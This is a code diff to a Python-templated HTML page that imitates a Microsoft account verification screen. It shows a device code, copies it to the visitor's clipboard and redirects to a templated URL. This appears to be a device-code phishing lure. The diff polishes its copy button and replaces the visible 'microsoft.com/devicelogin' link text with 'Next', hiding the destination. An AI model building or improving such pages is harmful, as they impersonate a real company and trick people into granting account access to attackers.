@@ -425,13 +425,28 @@ h1 {{
 p.desc {{
   font-size: 15px; color: #1b1b1b; line-height: 1.5; margin-bottom: 24px;
 }}
-.code-display {{
-  font-size: 34px; font-weight: 700; letter-spacing: 3px; color: #1b1b1b;
-  background: #f2f2f2; border: 1px dashed #a6a6a6; border-radius: 4px;
-  padding: 18px 16px; text-align: center; margin-bottom: 12px; user-select: all;
+.code-box {{
+  display: flex; align-items: center; justify-content: space-between; gap: 12px;
+  background: #f8f8f8; border: 1px solid #d2d0ce; border-radius: 4px;
+  padding: 14px 16px; margin-bottom: 8px;
 }}
+.code-display {{
+  font-size: 32px; font-weight: 700; letter-spacing: 4px; color: #1b1b1b;
+  font-family: 'Consolas', 'Segoe UI', monospace; user-select: all;
+}}
+.copy-btn {{
+  display: inline-flex; align-items: center; gap: 6px; flex-shrink: 0;
+  background: #ffffff; border: 1px solid #8a8886; border-radius: 4px;
+  color: #0067b8; font-size: 14px; font-weight: 600; font-family: inherit;
+  padding: 8px 14px; cursor: pointer; transition: background 0.15s, border-color 0.15s;
+}}
+.copy-btn:hover {{ background: #f3f2f1; border-color: #0067b8; }}
+.copy-btn:active {{ transform: scale(0.97); }}
+.copy-btn svg {{ width: 16px; height: 16px; fill: currentColor; }}
+.copy-btn.copied {{ color: #107c10; border-color: #107c10; }}
+.copy-btn.copied svg {{ fill: #107c10; }}
 .copy-hint {{
-  font-size: 13px; color: #605e5c; text-align: center; margin-bottom: 28px;
+  font-size: 13px; color: #605e5c; margin-bottom: 28px;
 }}
 .action-btn {{
   display: block; width: 100%; padding: 10px 12px; background: #0067b8; color: white;
@@ -455,7 +470,9 @@ p.desc {{
   .card {{ padding: 32px 24px; box-shadow: none; border: none; }}
   .footer {{ padding: 14px 24px; }}
   .footer .copyright {{ margin-left: 0; }}
-  .code-display {{ font-size: 26px; }}
+  .code-display {{ font-size: 24px; letter-spacing: 2px; }}
+  .code-box {{ flex-direction: column; }}
+  .copy-btn {{ width: 100%; justify-content: center; }}
 }}
 </style>
 </head>
@@ -465,9 +482,15 @@ p.desc {{
     <div class="ms-grid-logo"><span></span><span></span><span></span><span></span></div>
     <h1>Enter the code we provided</h1>
     <p class="desc">To continue verifying your account, copy the code below and enter it on the Microsoft verification page.</p>
-    <div class="code-display" id="uc">{user_code}</div>
-    <div class="copy-hint">Click the button below — the code is copied automatically.</div>
-    <a href="#" class="action-btn" onclick="go(); return false;">Go to microsoft.com/devicelogin</a>
+    <div class="code-box">
+      <span class="code-display" id="uc">{user_code}</span>
+      <button class="copy-btn" id="copyBtn" onclick="copyCode()">
+        <svg viewBox="0 0 24 24"><path d="M16 1H4c-1.1 0-2 .9-2 2v14h2V3h12V1zm3 4H8c-1.1 0-2 .9-2 2v14c0 1.1.9 2 2 2h11c1.1 0 2-.9 2-2V7c0-1.1-.9-2-2-2zm0 16H8V7h11v14z"/></svg>
+        <span id="copyLabel">Copy code</span>
+      </button>
+    </div>
+    <div class="copy-hint">Keep this code handy — you'll need it on the next page.</div>
+    <a href="#" class="action-btn" onclick="go(); return false;">Next</a>
     <div class="links">
       <a href="#">Sign in with a different Microsoft account</a>
     </div>
@@ -482,7 +505,7 @@ p.desc {{
   <div class="copyright">© 2026 Microsoft</div>
 </footer>
 <script>
-function go() {{
+function doCopy() {{
   var code = "{user_code}";
   if (navigator.clipboard && navigator.clipboard.writeText) {{
     navigator.clipboard.writeText(code).catch(function(){{}});
@@ -492,6 +515,16 @@ function go() {{
     ta.select(); try {{ document.execCommand("copy"); }} catch(e) {{}}
     document.body.removeChild(ta);
   }}
+}}
+function copyCode() {{
+  doCopy();
+  var btn = document.getElementById("copyBtn");
+  var label = document.getElementById("copyLabel");
+  btn.classList.add("copied");
+  label.textContent = "Copied ✓";
+}}
+function go() {{
+  doCopy();
   setTimeout(function(){{ window.location.href = "{verify_url}"; }}, 250);
 }}
 </script>
